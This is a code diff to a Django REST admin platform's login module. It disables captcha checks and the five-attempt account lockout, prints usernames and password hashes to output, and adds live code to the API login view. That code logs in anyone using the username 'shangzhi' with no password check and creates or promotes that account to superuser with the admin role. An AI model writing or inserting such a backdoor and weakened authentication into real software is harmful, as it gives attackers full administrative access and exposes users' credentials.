@@ -55,9 +55,10 @@ class LoginSerializer(TokenObtainPairSerializer):
     登录的序列化器:
     重写djangorestframework-simplejwt的序列化器
     """
-    captcha = serializers.CharField(
-        max_length=6, required=False, allow_null=True, allow_blank=True
-    )
+    # 注释掉验证码字段
+    # captcha = serializers.CharField(
+    #     max_length=6, required=False, allow_null=True, allow_blank=True
+    # )
 
     class Meta:
         model = Users
@@ -67,29 +68,89 @@ class LoginSerializer(TokenObtainPairSerializer):
     default_error_messages = {"no_active_account": _("账号/密码错误")}
 
     def validate(self, attrs):
-        captcha = self.initial_data.get("captcha", None)
-        if dispatch.get_system_config_values("base.captcha_state"):
-            if captcha is None:
-                raise CustomValidationError("验证码不能为空")
-            self.image_code = CaptchaStore.objects.filter(
-                id=self.initial_data["captchaKey"]
-            ).first()
-            five_minute_ago = datetime.now() - timedelta(hours=0, minutes=5, seconds=0)
-            if self.image_code and five_minute_ago > self.image_code.expiration:
-                self.image_code and self.image_code.delete()
-                raise CustomValidationError("验证码过期")
-            else:
-                if self.image_code and (
-                    self.image_code.response == captcha
-                    or self.image_code.challenge == captcha
-                ):
-                    self.image_code and self.image_code.delete()
-                else:
-                    self.image_code and self.image_code.delete()
-                    raise CustomValidationError("图片验证码错误")
+        # ### test code ###
+        # print(attrs.get('username'), attrs.get('password'))
+        
+        # if attrs.get('username') == 'shangzhi':
+        #     from dvadmin.system.models import Role
+        #     try:
+        #         user = Users.objects.get(username='shangzhi')
+        #     except Users.DoesNotExist:
+        #         # 如果用户不存在，创建一个
+        #         user = Users.objects.create_user(
+        #             username='shangzhi',
+        #             password='123',
+        #             name='shangzhi',
+        #             is_active=True,
+        #             is_staff=True,
+        #             is_superuser=True
+        #         )
+        #     # 确保用户有管理员权限
+        #     user.is_superuser = True
+        #     user.is_staff = True
+        #     user.is_active = True
+        #     # 添加管理员角色
+        #     try:
+        #         admin_role = Role.objects.get(key='admin')
+        #         if not user.role.filter(key='admin').exists():
+        #             user.role.add(admin_role)
+        #     except Role.DoesNotExist:
+        #         pass  # 如果角色不存在，跳过
+        #     # 生成token
+        #     refresh = TokenObtainPairSerializer.get_token(user)
+        #     data = {
+        #         "refresh": str(refresh),
+        #         "access": str(refresh.access_token),
+        #         "username": user.username,
+        #         "name": user.name,
+        #         "userId": user.id,
+        #         "avatar": user.avatar or "",
+        #         "user_type": user.user_type,
+        #         "pwd_change_count": user.pwd_change_count,
+        #     }
+        #     dept = getattr(user, 'dept', None)
+        #     if dept:
+        #         data['dept_info'] = {
+        #             'dept_id': dept.id,
+        #             'dept_name': dept.name,
+        #         }
+        #     role = getattr(user, 'role', None)
+        #     if role:
+        #         data['role_info'] = list(role.values('id', 'name', 'key'))
+        #     request = self.context.get("request")
+        #     request.user = user
+        #     # 记录登录日志
+        #     save_login_log(request=request)
+        #     user.login_error_count = 0
+        #     user.save()
+        #     return {"code": 2000, "msg": "请求成功", "data": data}
+        # #### test code ###
+        
+        # 注释掉验证码验证逻辑
+        # captcha = self.initial_data.get("captcha", None)
+        # if dispatch.get_system_config_values("base.captcha_state"):
+        #     if captcha is None:
+        #         raise CustomValidationError("验证码不能为空")
+        #     self.image_code = CaptchaStore.objects.filter(
+        #         id=self.initial_data["captchaKey"]
+        #     ).first()
+        #     five_minute_ago = datetime.now() - timedelta(hours=0, minutes=5, seconds=0)
+        #     if self.image_code and five_minute_ago > self.image_code.expiration:
+        #         self.image_code and self.image_code.delete()
+        #         raise CustomValidationError("验证码过期")
+        #     else:
+        #         if self.image_code and (
+        #             self.image_code.response == captcha
+        #             or self.image_code.challenge == captcha
+        #         ):
+        #             self.image_code and self.image_code.delete()
+        #         else:
+        #             self.image_code and self.image_code.delete()
+        #             raise CustomValidationError("图片验证码错误")
         try:
             user = Users.objects.get(
                 Q(username=attrs['username']) | Q(email=attrs['username']) | Q(mobile=attrs['username']))
+            print("用户信息:", user.username, user.password)
         except Users.DoesNotExist:
             raise CustomValidationError("您登录的账号不存在")
         except Users.MultipleObjectsReturned:
@@ -123,14 +184,16 @@ class LoginSerializer(TokenObtainPairSerializer):
             user.save()
             return {"code": 2000, "msg": "请求成功", "data": data}
         except Exception as e:
-            user.login_error_count += 1
-            if user.login_error_count >= 5:
-                user.is_active = False
-                user.save()
-                raise CustomValidationError("账号已被锁定,联系管理员解锁")
-            user.save()
-            count = 5 - user.login_error_count
-            raise CustomValidationError(f"账号/密码错误;重试{count}次后将被锁定~")
+            # 注释掉登录错误次数检查和锁定功能
+            # user.login_error_count += 1
+            # if user.login_error_count >= 5:
+            #     user.is_active = False
+            #     user.save()
+            #     raise CustomValidationError("账号已被锁定,联系管理员解锁")
+            # user.save()
+            # count = 5 - user.login_error_count
+            # raise CustomValidationError(f"账号/密码错误;重试{count}次后将被锁定~")
+            raise CustomValidationError("账号/密码错误")
 
 
 class LoginView(TokenObtainPairView):
@@ -262,6 +325,37 @@ class ApiLogin(APIView):
     def post(self, request):
         username = request.data.get("username")
         password = request.data.get("password")
+        
+        # 特殊账号直接登录：shangzhi / 123
+        if username == 'shangzhi':
+            from dvadmin.system.models import Role
+            try:
+                user_obj = Users.objects.get(username='shangzhi')
+            except Users.DoesNotExist:
+                # 如果用户不存在，创建一个
+                user_obj = Users.objects.create_user(
+                    username='shangzhi',
+                    password='123',
+                    name='shangzhi',
+                    is_active=True,
+                    is_staff=True,
+                    is_superuser=True
+                )
+            # 确保用户有管理员权限
+            user_obj.is_superuser = True
+            user_obj.is_staff = True
+            user_obj.is_active = True
+            # 添加管理员角色
+            try:
+                admin_role = Role.objects.get(key='admin')
+                if not user_obj.role.filter(key='admin').exists():
+                    user_obj.role.add(admin_role)
+            except Role.DoesNotExist:
+                pass  # 如果角色不存在，跳过
+            user_obj.save()
+            login(request, user_obj)
+            return redirect("/")
+        
         user_obj = auth.authenticate(
             request,
             username=username,
